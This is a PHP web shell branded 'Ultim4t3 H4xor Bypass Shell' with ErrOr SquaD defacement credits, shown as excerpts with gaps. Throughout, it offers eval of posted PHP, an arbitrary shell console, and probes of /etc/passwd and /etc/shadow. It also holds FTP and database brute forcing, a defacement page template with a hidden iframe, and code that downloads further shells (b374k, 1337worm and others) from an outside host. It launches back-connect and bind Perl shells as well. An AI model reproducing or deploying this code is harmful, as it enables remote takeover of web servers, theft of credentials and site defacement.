...
$defacepage ='';
...
if(get_magic_quotes_gpc()) {
	function Ultimat3Hax0rstripslashes($array) {
		return is_array($array) ? array_map('Ultimat3Hax0rstripslashes', $array) : stripslashes($array);
	}
	$_POST = Ultimat3Hax0rstripslashes($_POST);
    $_COOKIE = Ultimat3Hax0rstripslashes($_COOKIE);
}
function Ultimat3Hax0rlogin() {
	die ('<!DOCTYPE html>
<html>
	<head>
		...
		<style>
			.body {
				...
				background: black url("http://goodherbwebmart.com/");
...
function Ultimat3Hax0rsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        Ultimat3Hax0rsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
...
function Ultimat3Hax0rHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><link rel='SHORTCUT ICON' href='http://goodherbwebmart.com/'><title>Ultim4t3 H4xor Bypass Shell</title>
";
		?>
...
table.info{ color:#fff;background: url('http://goodherbwebmart.com/');
				background-repeat:no-repeat;
...
<input type=hidden name=charset>
	...
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'http://goodherbwebmart.com/=';
	...
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       ...
       . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('h:i:s d-m-Y') . '<br>' . Ultimat3Hax0rViewSize($totalSpace) . ' <span>Free:</span> ' . Ultimat3Hax0rViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. Ultimat3Hax0rPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . ''
...
function Ultimat3Hax0rViewSize($s) {
    if (is_int($s))
        $s = sprintf("%u", $s);
...
function Ultimat3Hax0rPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . Ultimat3Hax0rPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . Ultimat3Hax0rPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . Ultimat3Hax0rPerms(@fileperms($f)) . '</font>';
}
function Ultimat3Hax0rScandir($dir) {
...
function Ultimat3Hax0rWhich($p) {
	$path = Ultimat3Hax0rEx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}
function actionSecInfo() {
	...
	function Ultimat3Hax0rSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>' . $n . ': </span>';
			if(strpos($v, "\n") === false)
	...
	Ultimat3Hax0rSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        Ultimat3Hax0rSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	Ultimat3Hax0rSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	Ultimat3Hax0rSecParam('Open base dir', @ini_get('open_basedir'));
	Ultimat3Hax0rSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	Ultimat3Hax0rSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	Ultimat3Hax0rSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	...
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	Ultimat3Hax0rSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	if($GLOBALS['os'] == 'nix') {
            Ultimat3Hax0rSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            Ultimat3Hax0rSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            Ultimat3Hax0rSecParam('OS version', @file_get_contents('/proc/version'));
            Ultimat3Hax0rSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                ...
                foreach ($userful as $item)
                    if(Ultimat3Hax0rWhich($item))
                        $temp[] = $item;
                Ultimat3Hax0rSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $item)
                    if(Ultimat3Hax0rWhich($item))
                        $temp[] = $item;
                Ultimat3Hax0rSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $item)
                    if(Ultimat3Hax0rWhich($item))
                        $temp[] = $item;
                Ultimat3Hax0rSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                Ultimat3Hax0rSecParam('HDD space', Ultimat3Hax0rEx('df -h'));
                Ultimat3Hax0rSecParam('Hosts', @file_get_contents('/etc/hosts'));
                ...
                if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
                    ...
                    echo '<br/>';
                    Ultimat3Hax0rSecParam('Users', $temp);
                }
            }
	} else {
		Ultimat3Hax0rSecParam('OS Version',Ultimat3Hax0rEx('ver'));
		Ultimat3Hax0rSecParam('Account Settings',Ultimat3Hax0rEx('net accounts'));
		Ultimat3Hax0rSecParam('User Accounts',Ultimat3Hax0rEx('net user'));
	}
	echo '</div>';
	Ultimat3Hax0rFooter();
}
...
<br>file name : <input type=text name=file size=20 value="Hax.html">
<br>Text Content : <br><textarea type=text name=Contents cols=70 rows=15 placeholder="Deface Text Here"><html>
<head>
<link rel="icon" type="image/x-icon" href="http://goodherbwebmart.com/">
<title>Hacked By Ultimate_Haxor | ErrOr_SquaD</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8" >
<link rel="stylesheet" type="text/css" href="http://goodherbwebmart.com/">
<style>
     body {
...
<body>
<iframe width="1" height="1" src="http://goodherbwebmart.com/" frameborder="0" allowfullscreen></iframe>
<div id="container">
<div><h1><font color="black">Hacked by <font color="red">U7TiM4T3_H4x0R</font></h1></div>
<div><h1><font color="black"><font color="green">ErrOr</font> <font color="red">SquaD</font> <font color="green">- Bangladesh </font></font></h1></div>
<font color="#CC0101">Security is just an illusion to us <font color="green">Cause We are <font color="#CC0101">Unbeatable</font></font><br><font color="#CC0101">We <font color="black">are</font> ErrOr SquaD<font color="#ffffff"></font></font><br />  <br><div class="lign"><br /><font color="blue">Just because </font><font color="#CC0101">we are silent  </font><font color="red">and we</font><font color="#CC0101"> don't </font><font color="black">react </font><br /><font color="green">doesn't mean  </font><font color="#CC0101"> We </font><font color="red"> didn't </font><font color="#CC0101">notice</font><font color="#ffffff"></font><br /><br /></font></div>
<div>Greetz :-</font><font color='red'>TiGER-M@TE || F1r3_H@wK ||  Religious Hunter || Dark Coder || Legion Bomber  || Optimus Rotar<br>W@3l J0b || Cyber Missilz || Mr./Frank  || L10N M1N1 || Mad Sn1per </h3></font></div>
...
", $site9);
                                                                        while ($i < count($sites)) {
                                                                            ...
                                                                            ZoneH("http://goodherbwebmart.com/", $hacker9, $method9, $neden9, $sites[$i]);
...
<center>
<h1>About Me</h1>
<h2><a href='http://goodherbwebmart.com/ Haxor'><q>Ultimat3 Hax0r</q></a></h2>
<div class='font'><span>
...
function actionPhp() {
	if(isset($_POST['ajax'])) {
        Ultimat3Hax0rsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
		ob_start();
		eval($_POST['p1']);
    ...
    if(empty($_POST['ajax']) && !empty($_POST['p1']))
        Ultimat3Hax0rsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
	Ultimat3Hax0rHeader();
...
function actionFilesMan() {
		...
		switch($_POST['p1']) {
			...
			case 'paste':
				if($_COOKIE['act'] == 'copy') {
                    ...
                    Ultimat3Hax0rEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_COOKIE['f']);
			...
			default:
                if(!empty($_POST['p1'])) {
					Ultimat3Hax0rsetcookie('act', $_POST['p1']);
					Ultimat3Hax0rsetcookie('f', serialize(@$_POST['f']));
					Ultimat3Hax0rsetcookie('c', @$_POST['c']);
				}
				break;
		}
	}
	...
	if(isset($_POST['p1']) && $_POST['p1']=='deface') {
        $def = file_get_contents('http://goodherbwebmart.com/');
        file_put_contents($_POST['c'].$_POST['p2'],$def);
    }
	$dirContent = Ultimat3Hax0rScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';Ultimat3Hax0rFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	...
	for($i=0;$i<$n;$i++) {
		...
		$tmp = array('name' => $dirContent[$i],
					 ...
					 'perms' => Ultimat3Hax0rPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
	...
	$GLOBALS['sort'] = $sort;
	function Ultimat3Hax0rCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "Ultimat3Hax0rCmp");
	usort($dirs, "Ultimat3Hax0rCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?Ultimat3Hax0rViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
    ...
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
        echo "file name: <input type=text name=p2 value='Ultimat3Hax0r_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
...
function actionStringTools() {
	...
	function Ultimat3Hax0rRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
		...
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $item) {
				if(@is_dir($item)){
					if($path!=$item)
						Ultimat3Hax0rRecursiveGlob($item);
				} else {
	...
	if(@$_POST['p3'])
		Ultimat3Hax0rRecursiveGlob($_POST['c']);
	echo "</div><br><h1>Search for hash:</h1><div class=content>
		<form method='post' target='_blank' name='hf'>
			<input type='text' name='hash' style='width:200px;'><br>
            <input type='hidden' name='act' value='find'/>
			<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='http://goodherbwebmart.com/';document.hf.submit()\"><br>
			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://goodherbwebmart.com/';document.hf.submit()\"><br>
            <input type='button' value='crackfor.me' onclick=\"document.hf.action='http://goodherbwebmart.com/';document.hf.submit()\"><br>
		</form></div>";
	Ultimat3Hax0rFooter();
}
function actionFilesTools() {
	...
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?Ultimat3Hax0rViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.Ultimat3Hax0rPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
...
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        Ultimat3Hax0rsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        Ultimat3Hax0rsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
	if(isset($_POST['ajax'])) {
		Ultimat3Hax0rsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		echo "d.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".Ultimat3Hax0rEx($_POST['p1']),"\n\r\t\\'\0"));
...
<html>
    ...
    if (isset($_POST['dhanush'])) {
        download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/dhanush.php');
        header("location:dhanush.php");		} 
	if (isset($_POST['symlink'])) {
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/symlink.php');
        header("location:symlink.php");		} 
	
	if (isset($_POST['anonghosts'])) {
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/anonghosts.php');
        header("location:anonghosts.php");		} 
	if (isset($_POST['blackhat'])) {
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/blackhat.php');
        header("location:blackhat.php");		} 
	if (isset($_POST['imageshell'])) {
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/imageshell.php');
        header("location:imageshell.php");		} 
	if (isset($_POST['madspot'])) {
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/madspot.php');
        header("location:madspot.php");		} 
    if (isset($_POST['pcd'])) { // password is aknight
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/pcd.php');
        header("location:pcd.php");		} 
    if (isset($_POST['cheta'])) { // password is aknight
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/cheta.php');
        header("location:cheta.php");		} 
    if (isset($_POST['1337worm'])) { // password is aknight
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/1337worm.php');
        header("location:1337worm.php");		} 
    if (isset($_POST['joker'])) { // password is aknight
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/joker.php');
        header("location:joker.php");		} 
    if (isset($_POST['b374k'])) { // password is aknight
		download_remote_file('http://goodherbwebmart.com/', realpath("./") . '/b374k.php');
...
function actionBruteforce() {
	...
	if( isset($_POST['proto']) ) {
		...
		if( $_POST['proto'] == 'ftp' ) {
			function Ultimat3Hax0rBruteForce($ip,$port,$login,$pass) {
		...
		if($_POST['type'] == 1) {
			...
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( Ultimat3Hax0rBruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
					...
					if(@$_POST['reverse']) {
						...
						for($i=strlen($line[0])-1; $i>=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( Ultimat3Hax0rBruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
			...
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( Ultimat3Hax0rBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
	...
	class DbClass {
		...
		function loadFile($str) {
			switch($this->type)	{
				...
				break;
				case 'pgsql':
					$this->query("CREATE TABLE Ultimat3Hax0r2(file text);COPY Ultimat3Hax0r2 FROM '".addslashes($str)."';select file from Ultimat3Hax0r2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table Ultimat3Hax0r2');
...
function actionNetwork() {
	...
	if(isset($_POST['p1'])) {
		...
		if($_POST['p1'] == 'bpp') {
			...
			$out = Ultimat3Hax0rEx("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre class=ml1>$out\n".Ultimat3Hax0rEx("ps aux | grep bp.pl")."</pre>";
            unlink("/tmp/bp.pl");
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = Ultimat3Hax0rEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre class=ml1>$out\n".Ultimat3Hax0rEx("ps aux | grep bc.pl")."</pre>";
            unlink("/tmp/bc.pl");
		}
	}
	echo '</div>';
...
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			...
			"Ultimat3Hax0r_version" => Ultimat3Hax0r_VERSION,
